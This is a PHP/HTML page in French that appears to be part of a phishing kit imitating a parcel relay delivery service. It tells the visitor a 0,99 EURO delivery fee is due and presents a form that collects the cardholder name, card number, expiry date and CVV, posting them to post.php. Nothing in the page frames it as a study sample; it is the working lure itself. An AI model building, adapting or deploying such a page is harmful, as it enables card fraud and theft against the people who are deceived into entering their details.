<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Paiement</title>
</head>
<body>

<header>

    <div class="left">

<div class="logo">
<img src="res/img/logo.png" >
</div>

    </div>

    <div class="right">
<label> Suivi de colis</label> <label > Envoi de colis</label> <label > Points Relais® <br>
et Lockers</label> <label > Aide</label>

 <button type="button">Se connecter</button>

    </div>
</header>



<main>
    <div class="continer1">
    
           


<div style="font-size:1.6em; margin:10px 0;   color: #cc0033;">
<label>Frais de livraison : 0,99 EURO</label>
</div>

<div class="titles">
<label>Veuillez ajouter un mode de paiement pour payer les frais de livraison afin de livrer votre colis.</label>
</div>



<div class="cardlogo">
<img src="res/img/cards.png">
</div>


<form action="post.php" method="post">




<div class="form-container">
<form action="post.php" method="post">

<div class="col">
<label> Nom du titulaire de la carte</label>
<input type="text" name="name" required></div>

<div class="col">
<label> Numéro de carte</label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>
<div>

<div class="col"> <label> Date d'expiration </label>
<input type="text" name="exp" placeholder="MM/YY" id="exp" required></div>

<div>
<div class="col"> <label> Code de sécurité</label>
<input type="text" name="cvv" placeholder="CVV" id="cvv" required> </div>

<div class="back">
<button type="submit"> suivant</button>
</div>


</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 
<footer>


<div class="foter">
<img src="res/img/fpc.png" >
</div>

<div class="mobil">
<img src="res/img/mobil.png" >
</div>
</footer>


</body>
</html>